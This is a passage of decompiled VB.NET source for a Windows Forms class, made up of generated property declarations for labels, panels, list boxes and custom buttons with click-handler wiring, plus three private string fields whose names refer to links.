		' (set) Token: 0x06000074 RID: 116 RVA: 0x00006715 File Offset: 0x00004915
		Friend Overridable Property Label10 As Label

		' Token: 0x1700002D RID: 45
		' (get) Token: 0x06000075 RID: 117 RVA: 0x0000671E File Offset: 0x0000491E
		' (set) Token: 0x06000076 RID: 118 RVA: 0x00006728 File Offset: 0x00004928
		Friend Overridable Property ListBox3 As ListBox

		' Token: 0x1700002E RID: 46
		' (get) Token: 0x06000077 RID: 119 RVA: 0x00006731 File Offset: 0x00004931
		' (set) Token: 0x06000078 RID: 120 RVA: 0x0000673B File Offset: 0x0000493B
		Friend Overridable Property PanelBox6 As PanelBox

		' Token: 0x1700002F RID: 47
		' (get) Token: 0x06000079 RID: 121 RVA: 0x00006744 File Offset: 0x00004944
		' (set) Token: 0x0600007A RID: 122 RVA: 0x0000674E File Offset: 0x0000494E
		Friend Overridable Property Label11 As Label

		' Token: 0x17000030 RID: 48
		' (get) Token: 0x0600007B RID: 123 RVA: 0x00006757 File Offset: 0x00004957
		' (set) Token: 0x0600007C RID: 124 RVA: 0x00006764 File Offset: 0x00004964
		Friend Overridable Property ButtonGreen10 As ButtonGreen
			<CompilerGenerated()>
			Get
				Return Me._ButtonGreen10
			End Get
			<CompilerGenerated()>
			<MethodImpl(32)>
			Set(value As ButtonGreen)
				Dim eventHandler As EventHandler = AddressOf Me.ButtonGreen10_Click
				Dim buttonGreen As ButtonGreen = Me._ButtonGreen10
				If buttonGreen IsNot Nothing Then
					buttonGreen.Click -= eventHandler
				End If
				Me._ButtonGreen10 = value
				buttonGreen = Me._ButtonGreen10
				If buttonGreen IsNot Nothing Then
					buttonGreen.Click += eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000031 RID: 49
		' (get) Token: 0x0600007D RID: 125 RVA: 0x000067A7 File Offset: 0x000049A7
		' (set) Token: 0x0600007E RID: 126 RVA: 0x000067B1 File Offset: 0x000049B1
		Friend Overridable Property Label12 As Label

		' Token: 0x17000032 RID: 50
		' (get) Token: 0x0600007F RID: 127 RVA: 0x000067BA File Offset: 0x000049BA
		' (set) Token: 0x06000080 RID: 128 RVA: 0x000067C4 File Offset: 0x000049C4
		Friend Overridable Property PanelBox9 As PanelBox

		' Token: 0x17000033 RID: 51
		' (get) Token: 0x06000081 RID: 129 RVA: 0x000067CD File Offset: 0x000049CD
		' (set) Token: 0x06000082 RID: 130 RVA: 0x000067D7 File Offset: 0x000049D7
		Friend Overridable Property Label17 As Label

		' Token: 0x17000034 RID: 52
		' (get) Token: 0x06000083 RID: 131 RVA: 0x000067E0 File Offset: 0x000049E0
		' (set) Token: 0x06000084 RID: 132 RVA: 0x000067EC File Offset: 0x000049EC
		Friend Overridable Property ButtonGreen13 As ButtonGreen
			<CompilerGenerated()>
			Get
				Return Me._ButtonGreen13
			End Get
			<CompilerGenerated()>
			<MethodImpl(32)>
			Set(value As ButtonGreen)
				Dim eventHandler As EventHandler = AddressOf Me.ButtonGreen13_Click
				Dim buttonGreen As ButtonGreen = Me._ButtonGreen13
				If buttonGreen IsNot Nothing Then
					buttonGreen.Click -= eventHandler
				End If
				Me._ButtonGreen13 = value
				buttonGreen = Me._ButtonGreen13
				If buttonGreen IsNot Nothing Then
					buttonGreen.Click += eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000035 RID: 53
		' (get) Token: 0x06000085 RID: 133 RVA: 0x0000682F File Offset: 0x00004A2F
		' (set) Token: 0x06000086 RID: 134 RVA: 0x00006839 File Offset: 0x00004A39
		Friend Overridable Property Label18 As Label

		' Token: 0x17000036 RID: 54
		' (get) Token: 0x06000087 RID: 135 RVA: 0x00006842 File Offset: 0x00004A42
		' (set) Token: 0x06000088 RID: 136 RVA: 0x0000684C File Offset: 0x00004A4C
		Friend Overridable Property PanelBox8 As PanelBox

		' Token: 0x17000037 RID: 55
		' (get) Token: 0x06000089 RID: 137 RVA: 0x00006855 File Offset: 0x00004A55
		' (set) Token: 0x0600008A RID: 138 RVA: 0x0000685F File Offset: 0x00004A5F
		Friend Overridable Property Label15 As Label

		' Token: 0x17000038 RID: 56
		' (get) Token: 0x0600008B RID: 139 RVA: 0x00006868 File Offset: 0x00004A68
		' (set) Token: 0x0600008C RID: 140 RVA: 0x00006874 File Offset: 0x00004A74
		Friend Overridable Property ButtonGreen12 As ButtonGreen
			<CompilerGenerated()>
			Get
				Return Me._ButtonGreen12
			End Get
			<CompilerGenerated()>
			<MethodImpl(32)>
			Set(value As ButtonGreen)
				Dim eventHandler As EventHandler = AddressOf Me.ButtonGreen12_Click
				Dim buttonGreen As ButtonGreen = Me._ButtonGreen12
				If buttonGreen IsNot Nothing Then
					buttonGreen.Click -= eventHandler
				End If
				Me._ButtonGreen12 = value
				buttonGreen = Me._ButtonGreen12
				If buttonGreen IsNot Nothing Then
					buttonGreen.Click += eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000039 RID: 57
		' (get) Token: 0x0600008D RID: 141 RVA: 0x000068B7 File Offset: 0x00004AB7
		' (set) Token: 0x0600008E RID: 142 RVA: 0x000068C1 File Offset: 0x00004AC1
		Friend Overridable Property Label16 As Label

		' Token: 0x1700003A RID: 58
		' (get) Token: 0x0600008F RID: 143 RVA: 0x000068CA File Offset: 0x00004ACA
		' (set) Token: 0x06000090 RID: 144 RVA: 0x000068D4 File Offset: 0x00004AD4
		Friend Overridable Property PanelBox7 As PanelBox

		' Token: 0x1700003B RID: 59
		' (get) Token: 0x06000091 RID: 145 RVA: 0x000068DD File Offset: 0x00004ADD
		' (set) Token: 0x06000092 RID: 146 RVA: 0x000068E7 File Offset: 0x00004AE7
		Friend Overridable Property Label13 As Label

		' Token: 0x1700003C RID: 60
		' (get) Token: 0x06000093 RID: 147 RVA: 0x000068F0 File Offset: 0x00004AF0
		' (set) Token: 0x06000094 RID: 148 RVA: 0x000068FC File Offset: 0x00004AFC
		Friend Overridable Property ButtonGreen11 As ButtonGreen
			<CompilerGenerated()>
			Get
				Return Me._ButtonGreen11
			End Get
			<CompilerGenerated()>
			<MethodImpl(32)>
			Set(value As ButtonGreen)
				Dim eventHandler As EventHandler = AddressOf Me.ButtonGreen11_Click
				Dim buttonGreen As ButtonGreen = Me._ButtonGreen11
				If buttonGreen IsNot Nothing Then
					buttonGreen.Click -= eventHandler
				End If
				Me._ButtonGreen11 = value
				buttonGreen = Me._ButtonGreen11
				If buttonGreen IsNot Nothing Then
					buttonGreen.Click += eventHandler
				End If
			End Set
		End Property

		' Token: 0x1700003D RID: 61
		' (get) Token: 0x06000095 RID: 149 RVA: 0x0000693F File Offset: 0x00004B3F
		' (set) Token: 0x06000096 RID: 150 RVA: 0x00006949 File Offset: 0x00004B49
		Friend Overridable Property Label14 As Label

		' Token: 0x1700003E RID: 62
		' (get) Token: 0x06000097 RID: 151 RVA: 0x00006952 File Offset: 0x00004B52
		' (set) Token: 0x06000098 RID: 152 RVA: 0x0000695C File Offset: 0x00004B5C
		Friend Overridable Property PanelBox10 As PanelBox

		' Token: 0x1700003F RID: 63
		' (get) Token: 0x06000099 RID: 153 RVA: 0x00006965 File Offset: 0x00004B65
		' (set) Token: 0x0600009A RID: 154 RVA: 0x0000696F File Offset: 0x00004B6F
		Friend Overridable Property ListBox4 As ListBox

		' Token: 0x17000040 RID: 64
		' (get) Token: 0x0600009B RID: 155 RVA: 0x00006978 File Offset: 0x00004B78
		' (set) Token: 0x0600009C RID: 156 RVA: 0x00006982 File Offset: 0x00004B82
		Friend Overridable Property Label19 As Label

		' Token: 0x17000041 RID: 65
		' (get) Token: 0x0600009D RID: 157 RVA: 0x0000698B File Offset: 0x00004B8B
		' (set) Token: 0x0600009E RID: 158 RVA: 0x00006998 File Offset: 0x00004B98
		Friend Overridable Property ButtonGreen14 As ButtonGreen
			<CompilerGenerated()>
			Get
				Return Me._ButtonGreen14
			End Get
			<CompilerGenerated()>
			<MethodImpl(32)>
			Set(value As ButtonGreen)
				Dim eventHandler As EventHandler = AddressOf Me.ButtonGreen14_Click
				Dim buttonGreen As ButtonGreen = Me._ButtonGreen14
				If buttonGreen IsNot Nothing Then
					buttonGreen.Click -= eventHandler
				End If
				Me._ButtonGreen14 = value
				buttonGreen = Me._ButtonGreen14
				If buttonGreen IsNot Nothing Then
					buttonGreen.Click += eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000042 RID: 66
		' (get) Token: 0x0600009F RID: 159 RVA: 0x000069DB File Offset: 0x00004BDB
		' (set) Token: 0x060000A0 RID: 160 RVA: 0x000069E5 File Offset: 0x00004BE5
		Friend Overridable Property Label20 As Label

		' Token: 0x17000043 RID: 67
		' (get) Token: 0x060000A1 RID: 161 RVA: 0x000069EE File Offset: 0x00004BEE
		' (set) Token: 0x060000A2 RID: 162 RVA: 0x000069F8 File Offset: 0x00004BF8
		Friend Overridable Property PanelBox12 As PanelBox

		' Token: 0x17000044 RID: 68
		' (get) Token: 0x060000A3 RID: 163 RVA: 0x00006A01 File Offset: 0x00004C01
		' (set) Token: 0x060000A4 RID: 164 RVA: 0x00006A0B File Offset: 0x00004C0B
		Friend Overridable Property Label23 As Label

		' Token: 0x17000045 RID: 69
		' (get) Token: 0x060000A5 RID: 165 RVA: 0x00006A14 File Offset: 0x00004C14
		' (set) Token: 0x060000A6 RID: 166 RVA: 0x00006A20 File Offset: 0x00004C20
		Friend Overridable Property ButtonGreen16 As ButtonGreen
			<CompilerGenerated()>
			Get
				Return Me._ButtonGreen16
			End Get
			<CompilerGenerated()>
			<MethodImpl(32)>
			Set(value As ButtonGreen)
				Dim eventHandler As EventHandler = AddressOf Me.ButtonGreen16_Click
				Dim buttonGreen As ButtonGreen = Me._ButtonGreen16
				If buttonGreen IsNot Nothing Then
					buttonGreen.Click -= eventHandler
				End If
				Me._ButtonGreen16 = value
				buttonGreen = Me._ButtonGreen16
				If buttonGreen IsNot Nothing Then
					buttonGreen.Click += eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000046 RID: 70
		' (get) Token: 0x060000A7 RID: 167 RVA: 0x00006A63 File Offset: 0x00004C63
		' (set) Token: 0x060000A8 RID: 168 RVA: 0x00006A6D File Offset: 0x00004C6D
		Friend Overridable Property Label24 As Label

		' Token: 0x17000047 RID: 71
		' (get) Token: 0x060000A9 RID: 169 RVA: 0x00006A76 File Offset: 0x00004C76
		' (set) Token: 0x060000AA RID: 170 RVA: 0x00006A80 File Offset: 0x00004C80
		Friend Overridable Property PanelBox11 As PanelBox

		' Token: 0x17000048 RID: 72
		' (get) Token: 0x060000AB RID: 171 RVA: 0x00006A89 File Offset: 0x00004C89
		' (set) Token: 0x060000AC RID: 172 RVA: 0x00006A93 File Offset: 0x00004C93
		Friend Overridable Property Label21 As Label

		' Token: 0x17000049 RID: 73
		' (get) Token: 0x060000AD RID: 173 RVA: 0x00006A9C File Offset: 0x00004C9C
		' (set) Token: 0x060000AE RID: 174 RVA: 0x00006AA6 File Offset: 0x00004CA6
		Friend Overridable Property ButtonGreen15 As ButtonGreen

		' Token: 0x1700004A RID: 74
		' (get) Token: 0x060000AF RID: 175 RVA: 0x00006AAF File Offset: 0x00004CAF
		' (set) Token: 0x060000B0 RID: 176 RVA: 0x00006AB9 File Offset: 0x00004CB9
		Friend Overridable Property Label22 As Label

		' Token: 0x0400000B RID: 11
		Private linktoexe As String

		' Token: 0x0400000C RID: 12
		Private linktoexe_2 As String

		' Token: 0x0400000D RID: 13
		Private linktoi As String
	End Class
End Namespace
